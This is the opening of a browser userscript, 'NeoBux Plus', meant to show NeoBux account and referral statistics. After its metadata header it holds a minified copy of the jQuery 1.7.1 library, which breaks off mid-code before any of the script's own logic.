// ==UserScript==
// @name           NeoBux Plus
// @description    This script provides detailed statistics for your NeoBux account and referrals (ages of referrals, recent income/outcome averages, plus more). Spanish translation by Reinaldo Díaz.
// @author         Modified By Starlucky
// @namespace      http://userscripts.org/users/173064
// @include        http://www.neobux.com/c/rl/*
// @include        http://www.neobux.com/c/rs/*
// @include		   http://www.neobux.com/m/v/?vl=*
// @include        http://*.*cks.com/
// @license        GNU General Public License v3.0
// @version        3.4.121202.1113
// @grant          GM_getValue
// @grant          GM_setValue
// @grant          GM_addStyle
// @grant          GM_xmlhttpRequest
// @grant          GM_log
// @noframes
// ==/UserScript==
  /*! jQuery v1.7.1 jquery.com | jquery.org/license */
(function(a,b){function cy(a){return f.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:!1}function cv(a){if(!ck[a]){var b=c.body,d=f("<"+a+">").appendTo(b),e=d.css("display");d.remove();if(e==="none"||e===""){cl||(cl=c.createElement("iframe"),cl.frameBorder=cl.width=cl.height=0),b.appendChild(cl);if(!cm||!cl.createElement)cm=(cl.contentWindow||cl.contentDocument).document,cm.write((c.compatMode==="CSS1Compat"?"<!doctype html>":"")+"<html><body>"),cm.close();d=cm.createElement(a),cm.body.appendChild(d),e=f.css(d,"display"),b.removeChild(cl)}ck[a]=e}return ck[a]}function cu(a,b){var c={};f.each(cq.concat.apply([],cq.slice(0,b)),function(){c[this]=a});return c}function ct(){cr=b}function cs(){setTimeout(ct,0);return cr=f.now()}function cj(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}function ci(){try{return new a.XMLHttpRequest}catch(b){}}function cc(a,c){a.dataFilter&&(c=a.dataFilter(c,a.dataType));var d=a.dataTypes,e={},g,h,i=d.length,j,k=d[0],l,m,n,o,p;for(g=1;g<i;g++){if(g===1)for(h in a.converters)typeof h=="string"&&(e[h.toLowerCase()]=a.converters[h]);l=k,k=d[g];if(k==="*")k=l;else if(l!=="*"&&l!==k){m=l+" "+k,n=e[m]||e["* "+k];if(!n){p=b;for(o in e){j=o.split(" ");if(j[0]===l||j[0]==="*"){p=e[j[1]+" "+k];if(p){o=e[o],o===!0?n=p:p===!0&&(n=o);break}}}}!n&&!p&&f.error("No conversion from "+m.replace(" "," to ")),n!==!0&&(c=n?n(c):p(o(c)))}}return c}function cb(a,c,d){var e=a.contents,f=a.dataTypes,g=a.responseFields,h,i,j,k;for(i in g)i in d&&(c[g[i]]=d[i]);while(f[0]==="*")f.shift(),h===b&&(h=a.mimeType||c.getResponseHeader("content-type"));if(h)for(i in e)if(e[i]&&e[i].test(h)){f.unshift(i);break}if(f[0]in d)j=f[0];else{for(i in d){if(!f[0]||a.converters[i+" "+f[0]]){j=i;break}k||(k=i)}j=j||k}if(j){j!==f[0]&&f.unshift(j);return d[j]}}function ca(a,b,c,d){if(f.isArray(b))f.each(b,function(b,e){c||bE.test(a)?d(a,e):ca(a+"["+(typeof e=="object"||f.isArray(e)?b:"")+"]",e,c,d)});else if(!c&&b!=null&&typeof b=="object")for(var e in b)ca(a+"["+e+"]",b[e],c,d);else d(a,b)}function b_(a,c){var d,e,g=f.ajaxSettings.flatOptions||{};for(d in c)c[d]!==b&&((g[d]?a:e||(e={}))[d]=c[d]);e&&f.extend(!0,a,e)}function b$(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;var h=a[f],i=0,j=h?h.length:0,k=a===bT,l;for(;i<j&&(k||!l);i++)l=h[i](c,d,e),typeof l=="string"&&(!k||g[l]?l=b:(c.dataTypes.unshift(l),l=b$(a,c,d,e,l,g)));(k||!l)&&!g["*"]&&(l=b$(a,c,d,e,"*",g));return l}function bZ(a){return function(b,c){typeof b!="string"&&(c=b,b="*");if(f.isFunction(c)){var d=b.toLowerCase().split(bP),e=0,g=d.length,h,i,j;for(;e<g;e++)h=d[e],j=/^\+/.test(h),j&&(h=h.substr(1)||"*"),i=a[h]=a[h]||[],i[j?"unshift":"push"](c)}}}function bC(a,b,c){var d=b==="width"?a.offsetWidth:a.offsetHeight,e=b==="width"?bx:by,g=0,h=e.length;if(d>0){if(c!=="border")for(;g<h;g++)c||(d-=parseFloat(f.css(a,"padding"+e[g]))||0),c==="margin"?d+=parseFloat(f.css(a,c+e[g]))||0:d-=parseFloat(f.css(a,"border"+e[g]+"Width"))||0;return d+"px"}d=bz(a,b,b);if(d<0||d==null)d=a.style[b]||0;d=parseFloat(d)||0;if(c)for(;g<h;g++)d+=parseFloat(f.css(a,"padding"+e[g]))||0,c!=="padding"&&(d+=parseFloat(f.css(a,"border"+e[g]+"Width"))||0),c==="margin"&&(d+=parseFloat(f.css(a,c+e[g]))||0);return d+"px"}function bp(a,b){b.src?f.ajax({url:b.src,async:!1,dataType:"script"}):f.globalEval((b.text||b.textContent||b.innerHTML||"").replace(bf,"/*$0*/")),b.parentNode&&b.parentNode.removeChild(b)}function bo(a){var b=c.createElement("div");bh.appendChild(b),b.innerHTML=a.outerHTML;return b.firstChild}function bn(a){var b=(a.nodeName||"").toLowerCase();b==="input"?bm(a):b!=="script"&&typeof a.getElementsByTagName!="undefined"&&f.grep(a.getElementsByTagName("input"),bm)}function bm(a){if(a.type==="checkbox"||a.type==="radio")a.defaultChecked=a.checked}function bl(a){return typeof a.getElementsByTagName!="undefined"?a.getElementsByTagName("*"):typeof a.querySelectorAll!="undefined"?a.querySelectorAll("*"):[]}function bk(a,b){var c;if(b.nodeType===1){b.clearAttributes&&b.clearAttributes(),b.mergeAttributes&&b.mergeAttributes(a),c=b.nodeName.toLowerCase();if(c==="object")b.outerHTML=a.outerHTML;else if(c!=="input"||a.type!=="checkbox"&&a.type!=="radio"){if(c==="option")b.selected=a.defaultSelected;else if(c==="input"||c==="textarea")b.defaultValue=a.defaultValue}else a.checked&&(b.defaultChecked=b.checked=a.checked),b.value!==a.value&&(b.value=a.value);b.removeAttribute(f.expando)}}function bj(a,b){if(b.nodeType===1&&!!f.hasData(a)){var c,d,e,g=f._data(a),h=f._data(b,g),i=g.events;if(i){delete h.handle,h.events={};for(c in i)for(d=0,e=i[c].length;d<e;d++)f.event.add(b,c+(i[c][d].namespace?".":"")+i[c][d].namespace,i[c][d],i[c][d].data)}h.data&&(h.data=f.extend({},h.data))}}function bi(a,b){return f.nodeName(a,"table")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function U(a){var b=V.split("|"),c=a.createDocumentFragment();if(c.createElement)while(b.length)c.createElement(b.pop());return c}function T(a,b,c){b=b||0;if(f.isFunction(b))return f.grep(a,function(a,d){var e=!!b.call(a,d,a);return e===c});if(b.nodeType)return f.grep(a,function(a,d){return a===b===c});if(typeof b=="string"){var d=f.grep(a,function(a){return a.nodeType===1});if(O.test(b))return f.filter(b,d,!c);b=f.filter(b,d)}return f.grep(a,function(a,d){return f.inArray(a,b)>=0===c})}function S(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function K(){return!0}function J(){return!1}function n(a,b,c){var d=b+"defer",e=b+"queue",g=b+"mark",h=f._data(a,d);h&&(c==="queue"||!f._data(a,e))&&(c==="mark"||!f._data(a,g))&&setTimeout(function(){!f._data(a,e)&&!f._data(a,g)&&(f.removeData(a,d,!0),h.fire())},0)}function m(a){for(var b in a){if(b==="data"&&f.isEmptyObject(a[b]))continue;if(b!=="toJSON")return!1}return!0}function l(a,c,d){if(d===b&&a.nodeType===1){var e="data-"+c.replace(k,"-$1").toLowerCase();d=a.getAttribute(e);if(typeof d=="string"){try{d=d==="true"?!0:d==="false"?!1:d==="null"?null:f.isNumeric(d)?parseFloat(d):j.test(d)?f.parseJSON(d):d}catch(g){}f.data(a,c,d)}else d=b}return d}function h(a){var b=g[a]={},c,d;a=a.split(/\s+/);for(c=0,d=a.length;c<d;c++)b[a[c]]=!0;return b}var c=a.document,d=a.navigator,e=a.location,f=function(){function J(){if(!e.isReady){try{c.documentElement.doScroll("left")}catch(a){setTimeout(J,1);return}e.ready()}}var e=function(a,b){return new e.fn.init(a,b,h)},f=a.jQuery,g=a.$,h,i=/^(?:[^#<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,j=/\S/,k=/^\s+/,l=/\s+$/,m=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,n=/^[\],:{}\s]*$/,o=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,p=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,q=/(?:^|:|,)(?:\s*\[)+/g,r=/(webkit)[ \/]([\w.]+)/,s=/(opera)(?:.*version)?[ \/]([\w.]+)/,t=/(msie) ([\w.]+)/,u=/(mozilla)(?:.*? rv:([\w.]+))?/,v=/-([a-z]|[0-9])/ig,w=/^-ms-/,x=function(a,b){return(b+"").toUpperCase()},y=d.userAgent,z,A,B,C=Object.prototype.toString,D=Object.prototype.hasOwnProperty,E=Array.prototype.push,F=Array.prototype.slice,G=String.prototype.trim,H=Array.prototype.indexOf,I={};e.fn=e.prototype={constructor:e,init:function(a,d,f){var g,h,j,k;if(!a)return this;if(a.nodeType){this.context=this[0]=a,this.length=1;return this}if(a==="body"&&!d&&c.body){this.context=c,this[0]=c.body,this.selector=a,this.length=1;return this}if(typeof a=="string"){a.charAt(0)!=="<"||a.charAt(a.length-1)!==">"||a.length<3?g=i.exec(a):g=[null,a,null];if(g&&(g[1]||!d)){if(g[1]){d=d instanceof e?d[0]:d,k=d?d.ownerDocument||d:c,j=m.exec(a),j?e.isPlainObject(d)?(a=[c.createElement(j[1])],e.fn.attr.call(a,d,!0)):a=[k.createElement(j[1])]:(j=e.buildFragment([g[1]],[k]),a=(j.cacheable?e.clone(j.fragment):j.fragment).childNodes);return e.merge(this,a)}h=c.getElementById(g[2]);if(h&&h.parentNode){if(h.id!==g[2])return f.find(a);this.length=1,this[0]=h}this.context=c,this.selector=a;return this}return!d||d.jquery?(d||f).find(a):this.constructor(d).find(a)}if(e.isFunction(a))return f.ready(a);a.selector!==b&&(this.selector=a.selector,this.context=a.context);return e.makeArray(a,this)},selector:"",jquery:"1.7.1",length:0,size:function(){return this.length},toArray:function(){return F.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this[this.length+a]:this[a]},pushStack:function(a,b,c){var d=this.constructor();e.isArray(a)?E.apply(d,a):e.merge(d,a),d.prevObject=this,d.context=this.context,b==="find"?d.selector=this.selector+(this.selector?" ":"")+c:b&&(d.selector=this.selector+"."+b+"("+c+")");return d},each:function(a,b){return e.each(this,a,b)},ready:function(a){e.bindReady(),A.add(a);return this},eq:function(a){a=+a;return a===-1?this.slice(a):this.slice(a,a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(F.apply(this,arguments),"slice",F.call(arguments).join(","))},map:function(a){return this.pushStack(e.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:E,sort:[].sort,splice:[].splice},e.fn.init.prototype=e.fn,e.extend=e.fn.extend=function(){var a,c,d,f,g,h,i=arguments[0]||{},j=1,k=arguments.length,l=!1;typeof i=="boolean"&&(l=i,i=arguments[1]||{},j=2),typeof i!="object"&&!e.isFunction(i)&&(i={}),k===j&&(i=this,--j);for(;j<k;j++)if((a=arguments[j])!=null)for(c in a){d=i[c],f=a[c];if(i===f)continue;l&&f&&(e.isPlainObject(f)||(g=e.isArray(f)))?(g?(g=!1,h=d&&e.isArray(d)?d:[]):h=d&&e.isPlainObject(d)?d:{},i[c]=e.extend(l,h,f)):f!==b&&(i[c]=f)}return i},e.extend({noConflict:function(b){a.$===e&&(a.$=g),b&&a.jQuery===e&&(a.jQuery=f);return e},isReady:!1,readyWait:1,holdReady:function(a){a?e.readyWait++:e.ready(!0)},ready:function(a){if(a===!0&&!--e.readyWait||a!==!0&&!e.isReady){if(!c.body)return setTimeout(e.ready,1);e.isReady=!0;if(a!==!0&&--e.readyWait>0)return;A.fireWith(c,[e]),e.fn.trigger&&e(c).trigger("ready").off("ready")}},bindReady:function(){if(!A){A=e.Callbacks("once memory");if(c.readyState==="complete")return setTimeout(e.ready,1);if(c.addEventListener)c.addEventListener("DOMContentLoaded",B,!1),a.addEventListener("load",e.ready,!1);else if(c.attachEvent){c.attachEvent("onreadystatechange",B),a.attachEvent("onload",e.ready);var b=!1;try{b=a.frameElement==null}catch(d){}c.documentElement.doScroll&&b&&J()}}},isFunction:function(a){return e.type(a)==="function"},isArray:Array.isArray||function(a){return e.type(a)==="array"},isWindow:function(a){return a&&typeof a=="object"&&"setInterval"in a},isNumeric:function(a){return!isNaN(parseFloat(a))&&isFinite(a)},type:function(a){return a==null?String(a):I[C.call(a)]||"object"},isPlainObject:function(a){if(!a||e.type(a)!=="object"||a.nodeType||e.isWindow(a))return!1;try{if(a.constructor&&!D.call(a,"constructor")&&!D.call(a.constructor.prototype,"isPrototypeOf"))return!1}catch(c){return!1}var d;for(d in a);return d===b||D.call(a,d)},isEmptyObject:function(a){for(var b in a)return!1;return!0},error:function(a){throw new Error(a)},parseJSON:function(b){if(typeof b!="string"||!b)return null;b=e.trim(b);if(a.JSON&&a.JSON.parse)return a.JSON.parse(b);if(n.test(b.replace(o,"@").replace(p,"]").replace(q,"")))return(new Function("return "+b))();e.error("Invalid JSON: "+b)},parseXML:function(c){var d,f;try{a.DOMParser?(f=new DOMParser,d=f.parseFromString(c,"text/xml")):(d=new ActiveXObject("Microsoft.XMLDOM"),d.async="false",d.loadXML(c))}catch(g){d=b}(!d||!d.documentElement||d.getElementsByTagName("parsererror").length)&&e.error("Invalid XML: "+c);return d},noop:function(){},globalEval:function(b){b&&j.test(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(w,"ms-").replace(v,x)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,d){var f,g=0,h=a.length,i=h===b||e.isFunction(a);if(d){if(i){for(f in a)if(c.apply(a[f],d)===!1)break}else for(;g<h;)if(c.apply(a[g++],d)===!1)break}else if(i){for(f in a)if(c.call(a[f],f,a[f])===!1)break}else for(;g<h;)if(c.call(a[g],g,a[g++])===!1)break;return a},trim:G?function(a){return a==null?"":G.call(a)}:function(a){return a==null?"":(a+"").replace(k,"").replace(l,"")},makeArray:function(a,b){var c=b||[];if(a!=null){var d=e.type(a);a.length==null||d==="string"||d==="function"||d==="regexp"||e.isWindow(a)?E.call(c,a):e.merge(c,a)}return c},inArray:function(a,b,c){var d;if(b){if(H)return H.call(b,a,c);d=b.length,c=c?c<0?Math.max(0,d+c):c:0;for(;c<d;c++)if(c in b&&b[c]===a)return c}return-1},merge:function(a,c){var d=a.length,e=0;if(typeof c.length=="number")for(var f=c.length;e<f;e++)a[d++]=c[e];else while(c[e]!==b)a[d++]=c[e++];a.length=d;return a},grep:function(a,b,c){var d=[],e;c=!!c;for(var f=0,g=a.length;f<g;f++)e=!!b(a[f],f),c!==e&&d.push(a[f]);return d},map:function(a,c,d){var f,g,h=[],i=0,j=a.length,k=a instanceof e||j!==b&&typeof j=="number"&&(j>0&&a[0]&&a[j-1]||j===0||e.isArray(a));if(k)for(;i<j;i++)f=c(a[i],i,d),f!=null&&(h[h.length]=f);else for(g in a)f=c(a[g],g,d),f!=null&&(h[h.length]=f);return h.concat.apply([],h)},guid:1,proxy:function(a,c){if(typeof c=="string"){var d=a[c];c=a,a=d}if(!e.isFunction(a))return b;var f=F.call(arguments,2),g=function(){return a.apply(c,f.concat(F.call(arguments)))};g.guid=a.guid=a.guid||g.guid||e.guid++;return g},access:function(a,c,d,f,g,h){var i=a.length;if(typeof c=="object"){for(var j in c)e.access(a,j,c[j],f,g,d);return a}if(d!==b){f=!h&&f&&e.isFunction(d);for(var k=0;k<i;k++)g(a[k],c,f?d.call(a[k],k,g(a[k],c)):d,h);return a}return i?g(a[0],c):b},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();var b=r.exec(a)||s.exec(a)||t.exec(a)||a.indexOf("compatible")<0&&u.exec(a)||[];return{browser:b[1]||"",version:b[2]||"0"}},sub:function(){function a(b,c){return new a.fn.init(b,c)}e.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.sub=this.sub,a.fn.init=function(d,f){f&&f instanceof e&&!(f instanceof a)&&(f=a(f));return e.fn.init.call(this,d,f,b)},a.fn.init.prototype=a.fn;var b=a(c);return a},browser:{}}),e.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(a,b){I["[object "+b+"]"]=b.toLowerCase()}),z=e.uaMatch(y),z.browser&&(e.browser[z.browser]=!0,e.browser.version=z.version),e.browser.webkit&&(e.browser.safari=!0),j.test(" ")&&(k=/^[\s\xA0]+/,l=/[\s\xA0]+$/),h=e(c),c.addEventListener?B=function(){c.removeEventListener("DOMContentLoaded",B,!1),e.ready()}:c.attachEvent&&(B=function(){c.readyState==="complete"&&(c.detachEvent("onreadystatechange",B),e.ready())});return e}(),g={};f.Callbacks=function(a){a=a?g[a]||h(a):{};var c=[],d=[],e,i,j,k,l,m=function(b){var d,e,g,h,i;for(d=0,e=b.length;d<e;d++)g=b[d],h=f.type(g),h==="array"?m(g):h==="function"&&(!a.unique||!o.has(g))&&c.push(g)},n=function(b,f){f=f||[],e=!a.memory||[b,f],i=!0,l=j||0,j=0,k=c.length;for(;c&&l<k;l++)if(c[l].apply(b,f)===!1&&a.stopOnFalse){e=!0;break}i=!1,c&&(a.once?e===!0?o.disable():c=[]:d&&d.length&&(e=d.shift(),o.fireWith(e[0],e[1])))},o={add:function(){if(c){var a=c.length;m(arguments),i?k=c.length:e&&e!==!0&&(j=a,n(e[0],e[1]))}return this},remove:function(){if(c){var b=arguments,d=0,e=b.length;for(;d<e;d++)for(var f=0;f<c.length;f++)if(b[d]===c[f]){i&&f<=k&&(k--,f<=l&&l--),c.splice(f--,1);if(a.unique)break}}return this},has:function(a){if(c){var b=0,d=c.length;for(;b<d;b++)if(a===c[b])return!0}return!1},empty:function(){c=[];return this},disable:function(){c=d=e=b;return this},disabled:function(){return!c},lock:function(){d=b,(!e||e===!0)&&o.disable();return this},locked:function(){return!d},fireWith:function(b,c){d&&(i?a.once||d.push([b,c]):(!a.once||!e)&&n(b,c));return this},fire:function(){o.fireWith(this,arguments);return this},fired:function(){return!!e}};return o};var i=[].slice;f.extend({Deferred:function(a){var b=f.Callbacks("once memory"),c=f.Callbacks("once memory"),d=f.Callbacks("memory"),e="pending",g={resolve:b,reject:c,notify:d},h={done:b.add,fail:c.add,progress:d.add,state:function(){return e},isResolved:b.fired,isRejected:c.fired,then:function(a,b,c){i.done(a).fail(b).progress(c);return this},always:function(){i.done.apply(i,arguments).fail.apply(i,arguments);return this},pipe:function(a,b,c){return f.Deferred(function(d){f.each({done:[a,"resolve"],fail:[b,"reject"],progress:[c,"notify"]},function(a,b){var c=b[0],e=b[1],g;f.isFunction(c)?i[a](function(){g=c.apply(this,arguments),g&&f.isFunction(g.promise)?g.promise().then(d.resolve,d.reject,d.notify):d[e+"With"](this===i?d:this,[g])}):i[a](d[e])})}).promise()},promise:function(a){if(a==null)a=h;else for(var b in h)a[b]=h[b];return a}},i=h.promise({}),j;for(j in g)i[j]=g[j].fire,i[j+"With"]=g[j].fireWith;i.done(function(){e="resolved"},c.disable,d.lock).fail(function(){e="rejected"},b.disable,d.lock),a&&a.call(i,i);return i},when:function(a){function m(a){return function(b){e[a]=arguments.length>1?i.call(arguments,0):b,j.notifyWith(k,e)}}function l(a){return function(c){b[a]=arguments.length>1?i.call(arguments,0):c,--g||j.resolveWith(j,b)}}var b=i.call(arguments,0),c=0,d=b.length,e=Array(d),g=d,h=d,j=d<=1&&a&&f.isFunction(a.promise)?a:f.Deferred(),k=j.promise();if(d>1){for(;c<d;c++)b[c]&&b[c].promise&&f.isFunction(b[c].promise)?b[c].promise().then(l(c),j.reject,m(c)):--g;g||j.resolveWith(j,b)}else j!==a&&j.resolveWith(j,d?[a]:[]);return k}}),f.support=function(){var b,d,e,g,h,i,j,k,l,m,n,o,p,q=c.createElement("div"),r=c.documentElement;q.setAttribute("className","t"),q.innerHTML="   <link/><table></table><a href='/a' style='top:1px;float:left;opacity:.55;'>a</a><input type='checkbox'/>",d=q.getElementsByTagName("*"),e=q.getElementsByTagName("a")[0];if(!d||!d.length||!e)return{};g=c.createElement("select"),h=g.appendChild(c.createElement("option")),i=q.getElementsByTagName("input")[0],b={leadingWhitespace:q.firstChild.nodeType===3,tbody:!q.getElementsByTagName("tbody").length,htmlSerialize:!!q.getElementsByTagName("link").length,style:/top/.test(e.getAttribute("style")),hrefNormalized:e.getAttribute("href")==="/a",opacity:/^0.55/.test(e.style.opacity),cssFloat:!!e.style.cssFloat,checkOn:i.value==="on",optSelected:h.selected,getSetAttribute:q.className!=="t",enctype:!!c.createElement("form").enctype,html5Clone:c.createElement("nav").cloneNode(!0).outerHTML!=="<:nav></:nav>",submitBubbles:!0,changeBubbles:!0,focusinBubbles:!1,deleteExpando:!0,noCloneEvent:!0,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableMarginRight:!0},i.checked=!0,b.noCloneChecked=i.cloneNode(!0).checked,g.disabled=!0,b.optDisabled=!h.disabled;try{delete q.test}catch(s){b.deleteExpando=!1}!q.addEventListener&&q.attachEvent&&q.fireEvent&&(q.attachEvent("onclick",function(){b.noCloneEvent=!1}),q.cloneNode(!0).fireEvent("onclick")),i=c.createElement("input"),i.value="t",i.setAttribute("type","radio"),b.radioValue=i.value==="t",i.setAttribute("checked","checked"),q.appendChild(i),k=c.createDocumentFragment(),k.appendChild(q.lastChild),b.checkClone=k.cloneNode(!0).cloneNode(!0).lastChild.checked,b.appendChecked=i.checked,k.removeChild(i),k.appendChild(q),q.innerHTML="",a.getComputedStyle&&(j=c.createElement("div"),j.style.width="0",j.style.marginRight="0",q.style.width="2px",q.appendChild(j),b.reliableMarginRight=(parseInt((a.getComputedStyle(j,null)||{marginRight:0}).marginRight,10)||0)===0);if(q.attachEvent)for(o in{submit:1,change:1,focusin:1})n="on"+o,p=n in q,p||(q.setAttribute(n,"return;"),p=typeof q[n]=="function"),b[o+"Bubbles"]=p;k.removeChild(q),k=g=h=j=q=i=null,f(function(){var a,d,e,g,h,i,j,k,m,n,o,r=c.getElementsByTagName("body")[0];!r||(j=1,k="position:absolute;top:0;left:0;width:1px;height:1px;margin:0;",m="visibility:hidden;border:0;",n="style='"+k+"border:5px solid #000;padding:0;'",o="<div "+n+"><div></div></div>"+"<table "+n+" cellpadding='0' cellspacing='0'>"+"<tr><td></td></tr></table>",a=c.createElement("div"),a.style.cssText=m+"width:0;height:0;position:static;top:0;margin-top:"+j+"px",r.insertBefore(a,r.firstChild),q=c.createElement("div"),a.appendChild(q),q.innerHTML="<table><tr><td style='padding:0;border:0;display:none'></td><td>t</td></tr></table>",l=q.getElementsByTagName("td"),p=l[0].offsetHeight===0,l[0].style.display="",l[1].style.display="none",b.reliableHiddenOffsets=p&&l[0].offsetHeight===0,q.innerHTML="",q.style.width=q.style.paddingLeft="1px",f.boxModel=b.boxModel=q.offsetWidth===2,typeof q.style.zoom!="undefined"&&(q.style.display="inline",q.style.zoom=1,b.inlineBlockNeedsLayout=q.offsetWidth===2,q.style.display="",q.innerHTML="<div style='width:4px;'></div>",b.shrinkWrapBlocks=q.offsetWidth!==2),q.style.cssText=k+m,q.innerHTML=o,d=q.firstChild,e=d.firstChild,h=d.nextSibling.firstChild.firstChild,i={doesNotAddBorder:e.offsetTop!==5,doesAddBorderForTableAndCells:h.offsetTop===5},e.style.position="fixed",e.style.top="20px",i.fixedPosition=e.offsetTop===20||e.offsetTop===15,e.style.position=e.style.top="",d.style.overflow="hidden",d.style.position="relative",i.subtractsBorderForOverflowNotVisible=e.offsetTop===-5,i.doesNotIncludeMarginInBodyOffset=r.offsetTop!==j,r.removeChild(a),q=a=null,f.extend(b,i))});return b}();var j=/^(?:\{.*\}|\[.*\])$/,k=/([A-Z])/g;f.extend({cache:{},uuid:0,expando:"jQuery"+(f.fn.jquery+Math.random()).replace(/\D/g,""),noData:{embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:!0},hasData:function(a){a=a.nodeType?f.cache[a[f.expando]]:a[f.expando];return!!a&&!m(a)},data:function(a,c,d,e){if(!!f.acceptData(a)){var g,h,i,j=f.expando,k=typeof c=="string",l=a.nodeType,m=l?f.cache:a,n=l?a[j]:a[j]&&j,o=c==="events";if((!n||!m[n]||!o&&!e&&!m[n].data)&&k&&d===b)return;n||(l?a[j]=n=++f.uuid:n=j),m[n]||(m[n]={},l||(m[n].toJSON=f.noop));if(typeof c=="object"||typeof c=="function")e?m[n]=f.extend(m[n],c):m[n].data=f.extend(m[n].data,c);g=h=m[n],e||(h.data||(h.data={}),h=h.data),d!==b&&(h[f.camelCase(c)]=d);if(o&&!h[c])return g.events;k?(i=h[c],i==null&&(i=h[f.camelCase(c)])):i=h;return i}},removeData:function(a,b,c){if(!!f.acceptData(a)){var d,e,g,h=f.expando,i=a.nodeType,j=i?f.cache:a,k=i?a[h]:h;if(!j[k])return;if(b){d=c?j[k]:j[k].data;if(d){f.isArray(b)||(b in d?b=[b]:(b=f.camelCase(b),b in d?b=[b]:b=b.split(" ")));for(e=0,g=b.length;e<g;e++)delete d[b[e]];if(!(c?m:f.isEmptyObject)(d))return}}if(!c){delete j[k].data;if(!m(j[k]))return}f.support.deleteExpando||!j.setInterval?delete j[k]:j[k]=null,i&&(f.support.deleteExpando?delete a[h]:a.removeAttribute?a.removeAttribute(h):a[h]=null)}},_data:function(a,b,c){return f.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=f.noData[a.nodeName.toLowerCase()];if(b)return b!==!0&&a.getAttribute("classid")===b}return!0}}),f.fn.extend({data:function(a,c){var d,e,g,h=null;if(typeof a=="undefined"){if(this.length){h=f.data(this[0]);if(this[0].nodeType===1&&!f._data(this[0],"parsedAttrs")){e=this[0].attributes;for(var i=0,j=e.length;i<j;i++)g=e[i].name,g.indexOf("data-")===0&&(g=f.camelCase(g.substring(5)),l(this[0],g,h[g]));f._data(this[0],"parsedAttrs",!0)}}return h}if(typeof a=="object")return this.each(function(){f.data(this,a)});d=a.split("."),d[1]=d[1]?"."+d[1]:"";if(c===b){h=this.triggerHandler("getData"+d[1]+"!",[d[0]]),h===b&&this.length&&(h=f.data(this[0],a),h=l(this[0],a,h));return h===b&&d[1]?this.data(d[0]):h}return this.each(function(){var b=f(this),e=[d[0],c];b.triggerHandler("setData"+d[1]+"!",e),f.data(this,a,c),b.triggerHandler("changeData"+d[1]+"!",e)})},removeData:function(a){return this.each(function(){f.removeData(this,a)})}}),f.extend({_mark:function(a,b){a&&(b=(b||"fx")+"mark",f._data(a,b,(f._data(a,b)||0)+1))},_unmark:function(a,b,c){a!==!0&&(c=b,b=a,a=!1);if(b){c=c||"fx";var d=c+"mark",e=a?0:(f._data(b,d)||1)-1;e?f._data(b,d,e):(f.removeData(b,d,!0),n(b,c,"mark"))}},queue:function(a,b,c){var d;if(a){b=(b||"fx")+"queue",d=f._data(a,b),c&&(!d||f.isArray(c)?d=f._data(a,b,f.makeArray(c)):d.push(c));return d||[]}},dequeue:function(a,b){b=b||"fx";var c=f.queue(a,b),d=c.shift(),e={};d==="inprogress"&&(d=c.shift()),d&&(b==="fx"&&c.unshift("inprogress"),f._data(a,b+".run",e),d.call(a,function(){f.dequeue(a,b)},e)),c.length||(f.removeData(a,b+"queue "+b+".run",!0),n(a,b,"queue"))}}),f.fn.extend({queue:function(a,c){typeof a!="string"&&(c=a,a="fx");if(c===b)return f.queue(this[0],a);return this.each(function(){var b=f.queue(this,a,c);a==="fx"&&b[0]!=="inprogress"&&f.dequeue(this,a)})},dequeue:function(a){return this.each(function(){f.dequeue(this,a)})},delay:function(a,b){a=f.fx?f.fx.speeds[a]||a:a,b=b||"fx";return this.queue(b,function(b,c){var d=setTimeout(b,a);c.stop=function(){clearTimeout(d)}})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,c){function m(){--h||d.resolveWith(e,[e])}typeof a!="string"&&(c=a,a=b),a=a||"fx";var d=f.Deferred(),e=this,g=e.length,h=1,i=a+"defer",j=a+"queue",k=a+"mark",l;while(g--)if(l=f.data(e[g],i,b,!0)||(f.data(e[g],j,b,!0)||f.data(e[g],k,b,!0))&&f.data(e[g],i,f.Callbacks("once memory"),!0))h++,l.add(m);m();return d.promise()}});var o=/[\n\t\r]/g,p=/\s+/,q=/\r/g,r=/^(?:button|input)$/i,s=/^(?:button|input|object|select|textarea)$/i,t=/^a(?:rea)?$/i,u=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,v=f.support.getSetAttribute,w,x,y;f.fn.extend({attr:function(a,b){return f.access(this,a,b,!0,f.attr)},removeAttr:function(a){return this.each(function(){f.removeAttr(this,a)})},prop:function(a,b){return f.access(this,a,b,!0,f.prop)},removeProp:function(a){a=f.propFix[a]||a;return this.each(function(){try{this[a]=b,delete this[a]}catch(c){}})},addClass:function(a){var b,c,d,e,g,h,i;if(f.isFunction(a))return this.each(function(b){f(this).addClass(a.call(this,b,this.className))});if(a&&typeof a=="string"){b=a.split(p);for(c=0,d=this.length;c<d;c++){e=this[c];if(e.nodeType===1)if(!e.className&&b.length===1)e.className=a;else{g=" "+e.className+" ";for(h=0,i=b.length;h<i;h++)~g.indexOf(" "+b[h]+" ")||(g+=b[h]+" ");e.className=f.trim(g)}}}return this},removeClass:function(a){var c,d,e,g,h,i,j;if(f.isFunction(a))return this.each(function(b){f(this).removeClass(a.call(this,b,this.className))});if(a&&typeof 